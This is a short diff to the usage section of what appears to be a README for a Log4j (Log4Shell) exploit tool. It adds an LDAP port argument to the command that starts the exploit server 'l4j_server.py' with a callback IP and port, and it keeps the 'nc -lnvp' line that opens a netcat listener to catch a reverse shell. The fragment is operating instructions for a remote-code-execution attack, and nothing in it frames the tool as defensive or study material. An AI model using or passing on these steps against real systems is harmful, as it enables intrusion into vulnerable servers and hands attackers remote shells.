@@ -34,7 +34,7 @@ tar -xvf jdk-8u202-linux-x64.tar.gz
 
 ## Usage
 ```
-python3 l4j_server.py <callback_ip:callback_port> <HTTP_server_port>
+python3 l4j_server.py <callback_ip:callback_port> <HTTP_server_port> <LDAP_server_port>
 
 nc -lnvp <callback_port>
 
